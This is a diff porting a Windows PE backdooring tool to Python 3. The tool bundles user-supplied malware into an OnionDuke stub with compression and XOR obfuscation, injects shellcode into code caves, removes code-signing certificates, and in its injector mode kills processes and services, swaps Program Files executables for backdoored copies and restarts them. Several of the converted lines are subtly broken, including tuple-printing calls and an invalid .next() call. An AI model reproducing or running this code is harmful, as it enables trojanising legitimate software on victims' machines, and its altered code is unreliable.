                 self.rsrc_section.write(self.binary.read(self.flItms['rsrcSizeRawData']))
                 self.rsrc_section.seek(0)
-                print "[*] Updating", self.FILE, "rsrc section"
+                print(("[*] Updating", self.FILE, "rsrc section"))
                 write_rsrc(self.rsrc_section, self.flItms['rsrcVirtualAddress'], 0x16000)
                 self.rsrc_section.seek(0)
                 self.od_rsrc_begin = od_stub.tell()
-                print "[*] Adding", self.FILE, "rsrc to OnionDuke stub"
+                print(("[*] Adding", self.FILE, "rsrc to OnionDuke stub"))
                 od_stub.write(self.rsrc_section.read())
                 self.od_binary_begin = od_stub.tell()
 
                 #compress
-                print "[*] Compressing", self.FILE, "with aPLib"
+                print(("[*] Compressing", self.FILE, "with aPLib"))
                 #USE Tempfile
                 compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                 subprocess.check_output(['appack', "c", self.FILE, compressedbin])
 
                 xorkey = random.randint(0, 4294967295)
-                print "[*] Xor'ing", self.FILE, "with key:", hex(xorkey)
+                print(("[*] Xor'ing", self.FILE, "with key:", hex(xorkey)))
                 with open(compressedbin, 'r') as compressedBinary:
-                    xorBinary = cStringIO.StringIO()
+                    xorBinary = io.StringIO()
                     xor_file(compressedBinary, xorBinary, xorkey)
                 xorBinary.seek(0)
-                print "[*] Appending compressed binary after rsrc section"
+                print("[*] Appending compressed binary after rsrc section")
                 od_stub.write(xorBinary.read())
                 self.od_begin_malware = od_stub.tell()
                 os.remove(compressedbin)
 
-                print "[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"
+                print(("[*] Compressing", self.SUPPLIED_BINARY, "with aPLib"))
                 compressedbin = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(12))
                 subprocess.check_output(['appack', "c", self.SUPPLIED_BINARY, compressedbin])
 
-                print "[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)
+                print(("[*] Xor'ing", self.SUPPLIED_BINARY, "with key:", hex(xorkey)))
                 with open(compressedbin, 'r') as compressedBinary:
-                    xorBinary = cStringIO.StringIO()
+                    xorBinary = io.StringIO()
                     xor_file(compressedBinary, xorBinary, xorkey)
                 xorBinary.seek(0)
-                print "[*] Appending compressed user supplied binary after target binary"
+                print("[*] Appending compressed user supplied binary after target binary")
                 od_stub.write(xorBinary.read())
                 self.od_end_malware = od_stub.tell()
                 os.remove(compressedbin)
@@ -1628,13 +1628,13 @@ class pebin():
             
         #check submitted file to see if it is a DLL:
         with open(self.SUPPLIED_BINARY, 'r') as self.binary:
-            print "[?] Checking if user supplied is a DLL"
+            print("[?] Checking if user supplied is a DLL")
             self.gather_file_info_win()
 
             #Check if DLL
             if (self.flItms['Characteristics'] % 0x4000) - 0x2000 > 0 and self.flItms['DllCharacteristics'] > 0:
-                print "[!] User supplied malware is a DLL!"
-                print "[*] Patching OnionDuke Stub for DLL usage"
+                print("[!] User supplied malware is a DLL!")
+                print("[*] Patching OnionDuke Stub for DLL usage")
                 self.binary.seek(0)
                 #patch for dll
                 od_stub.seek(0xfd38, 0)
@@ -1653,7 +1653,7 @@ class pebin():
                     od_stub.seek(0xfd44, 0)
                     od_stub.write("\x01\x00\x00\x00")
             else:
-                print "[*] User supplied malware is not a DLL"
+                print("[*] User supplied malware is not a DLL")
 
         # write to file
         od_stub.seek(0)
@@ -1664,9 +1664,9 @@ class pebin():
                 if self.parse_rsrc() is True:
                     patch_result = self.patch_runlevel()
                     if patch_result is False:
-                        print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
+                        print("[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist")
                 else:
-                    print '[!] No manifest in rsrc'
+                    print('[!] No manifest in rsrc')
 
         return True
 
@@ -1677,7 +1677,7 @@ class pebin():
         if self.ZERO_CERT is True and self.flItms['CertLOC'] != 0:
             with open(self.flItms['backdoorfile'], "r+b") as self.binary:
                 self.gather_file_info_win()
-                print "[*] Overwriting certificate table pointer"
+                print("[*] Overwriting certificate table pointer")
                 self.binary.seek(-self.flItms['CertSize'], os.SEEK_END)
                 self.binary.truncate()
                 self.binary.seek(self.flItms['CertTableLOC'], 0)
@@ -1689,7 +1689,7 @@ class pebin():
         This function operates the sequence of all involved
         functions to perform the binary patching.
         """
-        print "[*] In the backdoor module"
+        print("[*] In the backdoor module")
         # TODO: Take out Injector
 
         if self.INJECTOR is False:
@@ -1702,7 +1702,7 @@ class pebin():
                 self.OUTPUT = "backdoored/" + self.OUTPUT
 
         if self.PATCH_METHOD.lower() == 'replace':
-            print "[*] Using replace method, copying supplied binary"
+            print("[*] Using replace method, copying supplied binary")
             self.flItms['backdoorfile'] = self.SUPPLIED_BINARY
             shutil.copy2(self.SUPPLIED_BINARY, self.OUTPUT)
             return True
@@ -1716,13 +1716,13 @@ class pebin():
             self.preprocess()
         
         if self.PATCH_METHOD == 'onionduke':
-            print "[!] Attempting OnionDuke patching"
+            print("[!] Attempting OnionDuke patching")
             # move OS check here.
             result = self.onionduke()
             if result:
                 return result
             else:
-                print "[!] OnionDuke patching failed"
+                print("[!] OnionDuke patching failed")
                 return result
 
         self.flItms['NewCodeCave'] = self.ADD_SECTION
@@ -1750,22 +1750,22 @@ class pebin():
             self.check_apis(self.FILE)
             iat_result = ''
             if "UPX".lower() in self.flItms['textSectionName'].lower():
-                print "[!] Cannot patch a new IAT into a UPX binary at this time."
+                print("[!] Cannot patch a new IAT into a UPX binary at this time.")
                 return False
             if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is True:
                 iat_result = self.patch_in_new_iat()
-                print "[*] Checking updated IAT for thunks"
+                print("[*] Checking updated IAT for thunks")
                 self.check_apis(self.flItms['backdoorfile'])
 
             # if this IDT_IN_CAVE is true and it did not work... reset and go normal route
             if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is True:
-                print "[!] Resetting the file"
+                print("[!] Resetting the file")
                 shutil.copy2(self.FILE, self.flItms['backdoorfile'])
                 self.remove_signing()
                 iat_result = self.create_new_iat()
                 if iat_result is False:
                     return False
-                print "[*] Checking updated IAT for thunks"
+                print("[*] Checking updated IAT for thunks")
                 self.check_apis(self.flItms['backdoorfile'])
 
             if self.flItms['neededAPIs'] != set() and self.flItms['IDT_IN_CAVE'] is False:
@@ -1773,11 +1773,11 @@ class pebin():
                 iat_result = self.create_new_iat()
                 if iat_result is False:
                     return False
-                print "[*] Checking updated IAT for thunks"
+                print("[*] Checking updated IAT for thunks")
                 self.check_apis(self.flItms['backdoorfile'])
 
         if self.set_shells() is False or self.flItms['allshells'] is False:
-            print "[!] Could not set selected shellcode!"
+            print("[!] Could not set selected shellcode!")
             return False
 
         self.binary = open(self.flItms['backdoorfile'], "r+b")
@@ -1786,9 +1786,9 @@ class pebin():
             if self.parse_rsrc() is True:
                 patch_result = self.patch_runlevel()
                 if patch_result is False:
-                    print "[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist"
+                    print("[!] Could not patch higher run level in manifest, requestedExecutionLevel did not exist")
             else:
-                print '[!] No manifest in rsrc'
+                print('[!] No manifest in rsrc')
 
         #reserve space for shellcode
         targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
@@ -1816,7 +1816,7 @@ class pebin():
                     self.flItms['CodeCaveLOC'] = 0
                     self.flItms['cave_jumping'] = False
                     self.flItms['CavesPicked'] = {}
-                    print "[!] Appending new section for payload"
+                    print("[!] Appending new section for payload")
                     self.set_shells()
                     caves_set = True
                 elif self.flItms['CavesPicked'].lower() in ['jump', 'j']:
@@ -1824,7 +1824,7 @@ class pebin():
                     self.flItms['CodeCaveLOC'] = 0
                     self.flItms['cave_jumping'] = True
                     self.flItms['CavesPicked'] = {}
-                    print "-resetting shells"
+                    print("-resetting shells")
                     self.set_shells()
                     continue
                 elif self.flItms['CavesPicked'].lower() in ['single', 's']:
@@ -1832,7 +1832,7 @@ class pebin():
                     self.flItms['CodeCaveLOC'] = 0
                     self.flItms['cave_jumping'] = False
                     self.flItms['CavesPicked'] = {}
-                    print "-resetting shells"
+                    print("-resetting shells")
                     self.set_shells()
                     continue
                 elif self.flItms['CavesPicked'].lower() in ['ignore', 'i', 'q']:
@@ -1841,14 +1841,14 @@ class pebin():
             elif self.flItms['CavesPicked'] is None:
                 return None
             else:
-                self.flItms['JMPtoCodeAddress'] = self.flItms['CavesPicked'].iteritems().next()[1][6]
+                self.flItms['JMPtoCodeAddress'] = iter(list(self.flItms['CavesPicked'].items())).next()[1][6]
                 caves_set = True
             #else:
             #    caves_set = True
 
         # Assigning code caves to fix
         if self.flItms['CavesPicked'] != {}:
-            for cave, values in self.flItms['CavesPicked'].iteritems():
+            for cave, values in list(self.flItms['CavesPicked'].items()):
                 self.flItms['CavesToFix'][cave] = [values[6] + 5 + self.flItms['PatchLocation'], self.flItms['len_allshells'][cave]]
 
         #If no cave found, continue to create one.
@@ -1857,7 +1857,7 @@ class pebin():
             if create_cave_result is False:
                 return False
             self.flItms['NewCodeCave'] = True
-            print "- Adding a new section to the exe/dll for shellcode injection"
+            print("- Adding a new section to the exe/dll for shellcode injection")
         else:
             self.flItms['LastCaveAddress'] = self.flItms['CavesPicked'][len(self.flItms['CavesPicked']) - 1][6]
 
@@ -1890,14 +1890,14 @@ class pebin():
             self.binary.seek(self.flItms['newSectionPointerToRawData'] + self.flItms['buffer'])
             self.binary.write(self.flItms['completeShellcode'])
         if self.flItms['cave_jumping'] is True:
-            for i, item in self.flItms['CavesPicked'].iteritems():
+            for i, item in list(self.flItms['CavesPicked'].items()):
                 self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16), 0)
                 self.binary.write(self.flItms['allshells'][i])
                 #So we can jump to our resumeExe shellcode
                 if i == (len(self.flItms['CavesPicked']) - 2) and self.flItms['stager'] is False:
                     self.binary.write(temp_jmp)
         else:
-            for i, item in self.flItms['CavesPicked'].iteritems():
+            for i, item in list(self.flItms['CavesPicked'].items()):
                 if i == 0:
                     self.binary.seek(int(self.flItms['CavesPicked'][i][1], 16))
                     self.binary.write(self.flItms['completeShellcode'])
@@ -1913,10 +1913,10 @@ class pebin():
             p.wait()
             out, err = p.communicate()
             if 'succeeded' in out.lower():
-                print "[*] Code Signing Succeeded"
+                print("[*] Code Signing Succeeded")
             else:
-                print "[!!!!] Code Signing Failed check your certs [!!!!]" 
-                print str(err).strip("\n")
+                print("[!!!!] Code Signing Failed check your certs [!!!!]") 
+                print((str(err).strip("\n")))
 
         if self.VERBOSE is True:
             self.print_flItms(self.flItms)
@@ -1927,7 +1927,7 @@ class pebin():
         
             if self.keep_temp is True:
                 # tmpfilename_orginalname.exe
-                print "[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
+                print(("[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE)) 
                 shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
             try:
                 shutil.rmtree(self.tmp_file.name)
@@ -1964,25 +1964,25 @@ class pebin():
         if self.flItms['Magic'] == int('20B', 16):
             self.flItms['bintype'] = winI64_shellcode
         if not self.SHELL:
-            print "You must choose a backdoor to add: (use -s)"
+            print("You must choose a backdoor to add: (use -s)")
             for item in dir(self.flItms['bintype']):
                 if "__" in item:
                     continue
                 elif item in ignores:
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print(("   {0}".format(item)))
             return False
 
         if self.SHELL not in dir(self.flItms['bintype']):
-            print "The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]
+            print(("The following %ss are available: (use -s)" % str(self.flItms['bintype']).split(".")[1]))
             for item in dir(self.flItms['bintype']):
                 if "__" in item:
                     continue
                 elif item in ignores:
                     continue
                 else:
-                    print "   {0}".format(item)
+                    print(("   {0}".format(item)))
                     avail_shells.append(item)
             self.flItms['avail_shells'] = avail_shells
             return False
@@ -1993,7 +1993,7 @@ class pebin():
         """
         This function sets the shellcode.
         """
-        print "[*] Looking for and setting selected shellcode"
+        print("[*] Looking for and setting selected shellcode")
 
         if self.check_shells() is False:
             return False
@@ -2045,17 +2045,17 @@ class pebin():
                                                'tv_x32.exe'), None, True]
                            }
 
-        print "[*] Beginning injector module"
+        print("[*] Beginning injector module")
         os_name = os.name
         if os_name == 'nt':
             if "PROGRAMFILES(x86)" in os.environ:
-                print "-You have a 64 bit system"
+                print("-You have a 64 bit system")
                 system_type = 64
             else:
-                print "-You have a 32 bit system"
+                print("-You have a 32 bit system")
                 system_type = 32
         else:
-            print "This works only on windows. :("
+            print("This works only on windows. :(")
             sys.exit()
         winversion = platform.version()
         rootdir = os.path.splitdrive(sys.executable)[0]
@@ -2072,11 +2072,11 @@ class pebin():
 
         #need win2003, win2008, win8
         if "5.0." in winversion:
-            print "-OS is 2000"
+            print("-OS is 2000")
             targetdirs = targetdirs + winXP2003x86targetdirs
             excludedirs = excludedirs + winXP2003x86excludedirs
         elif "5.1." in winversion:
-            print "-OS is XP"
+            print("-OS is XP")
             if system_type == 64:
                 targetdirs.append(rootdir + '\\Program Files (x86)\\')
                 excludedirs.append(vista7win82012x64excludedirs)
@@ -2084,7 +2084,7 @@ class pebin():
                 targetdirs = targetdirs + winXP2003x86targetdirs
                 excludedirs = excludedirs + winXP2003x86excludedirs
         elif "5.2." in winversion:
-            print "-OS is 2003"
+            print("-OS is 2003")
             if system_type == 64:
                 targetdirs.append(rootdir + '\\Program Files (x86)\\')
                 excludedirs.append(vista7win82012x64excludedirs)
@@ -2092,7 +2092,7 @@ class pebin():
                 targetdirs = targetdirs + winXP2003x86targetdirs
                 excludedirs = excludedirs + winXP2003x86excludedirs
         elif "6.0." in winversion:
-            print "-OS is Vista/2008"
+            print("-OS is Vista/2008")
             if system_type == 64:
                 targetdirs = targetdirs + vista7win82012x64targetdirs
                 excludedirs = excludedirs + vista7win82012x64excludedirs
@@ -2100,7 +2100,7 @@ class pebin():
                 targetdirs.append(rootdir + '\\Program Files\\')
                 excludedirs.append(rootdir + '\\Windows\\')
         elif "6.1." in winversion:
-            print "-OS is Win7/2008"
+            print("-OS is Win7/2008")
             if system_type == 64:
                 targetdirs = targetdirs + vista7win82012x64targetdirs
                 excludedirs = excludedirs + vista7win82012x64excludedirs
@@ -2108,7 +2108,7 @@ class pebin():
                 targetdirs.append(rootdir + '\\Program Files\\')
                 excludedirs.append(rootdir + '\\Windows\\')
         elif "6.2." in winversion:
-            print "-OS is Win8/2012"
+            print("-OS is Win8/2012")
             targetdirs = targetdirs + vista7win82012x64targetdirs
             excludedirs = excludedirs + vista7win82012x64excludedirs
 
@@ -2124,9 +2124,9 @@ class pebin():
                 if exclude is False:
                     for _file in files:
                         f = os.path.join(root, _file)
-                        for target, items in list_of_targets.iteritems():
+                        for target, items in list(list_of_targets.items()):
                             if target.lower() == _file.lower():
-                                print "-- Found the following file:", root + '\\' + _file
+                                print(("-- Found the following file:", root + '\\' + _file))
                                 filelist.add(f)
 
                 exclude = False
@@ -2152,33 +2152,33 @@ class pebin():
             #   continue
             filename = os.path.basename(target)
             for process in process_list:
-                for setprocess, items in list_of_targets.iteritems():
+                for setprocess, items in list(list_of_targets.items()):
                     if setprocess.lower() in target.lower():
                         for item in items[0]:
                             if item.lower() in [x.lower() for x in process]:
-                                print "- Killing process:", item
+                                print(("- Killing process:", item))
                                 try:
                                     os.system("taskkill /F /PID %i" %
                                               int(process[1]))
                                     running_proc = True
                                 except Exception as e:
-                                    print str(e)
+                                    print((str(e)))
                         if setprocess.lower() in [x.lower() for x in process]:
                             if items[1] is not None:
-                                print "- Killing Service:", items[1]
+                                print(("- Killing Service:", items[1]))
                                 try:
                                     os.system('net stop %s' % items[1])
                                 except Exception as e:
-                                    print str(e)
+                                    print((str(e)))
                                 service_target = True
 
             time.sleep(1)
             #backdoor the targets here:
-            print "*" * 50
+            print(("*" * 50))
             self.FILE = target
             self.OUTPUT = os.path.basename(self.FILE + '.bd')
-            print "self.OUTPUT", self.OUTPUT
-            print "- Backdooring:", self.FILE
+            print(("self.OUTPUT", self.OUTPUT))
+            print(("- Backdooring:", self.FILE))
             result = self.patch_pe()
             if result:
                 pass
@@ -2190,7 +2190,7 @@ class pebin():
             try:
                 os.unlink(self.FILE)
             except:
-                print "unlinking error"
+                print("unlinking error")
             time.sleep(.5)
             try:
                 shutil.copy2(self.OUTPUT, self.FILE)
@@ -2198,11 +2198,11 @@ class pebin():
                 os.system('move {0} {1}'.format(self.FILE, self.OUTPUT))
             time.sleep(.5)
             os.remove(self.OUTPUT)
-            print (" - The original file {0} has been renamed to {1}".format(self.FILE,
-                   self.FILE + self.SUFFIX))
+            print((" - The original file {0} has been renamed to {1}".format(self.FILE,
+                   self.FILE + self.SUFFIX)))
 
             if self.DELETE_ORIGINAL is True:
-                print "!!Warning Deleteing Original File!!"
+                print("!!Warning Deleteing Original File!!")
                 os.remove(self.FILE + self.SUFFIX)
 
             if service_target is True:
@@ -2212,14 +2212,14 @@ class pebin():
                     if (list_of_targets[filename][2] is True and
                        running_proc is True):
                         subprocess.Popen([self.FILE, ])
-                        print "- Restarting:", self.FILE
+                        print(("- Restarting:", self.FILE))
                     else:
-                        print "-- %s was not found online -  not restarting" % self.FILE
+                        print(("-- %s was not found online -  not restarting" % self.FILE))
 
                 except:
                     if (list_of_targets[filename.lower()][2] is True and
                        running_proc is True):
                         subprocess.Popen([self.FILE, ])
-                        print "- Restarting:", self.FILE
+                        print(("- Restarting:", self.FILE))
                     else:
-                        print "-- %s was not found online -  not restarting" % self.FILE
+                        print(("-- %s was not found online -  not restarting" % self.FILE))
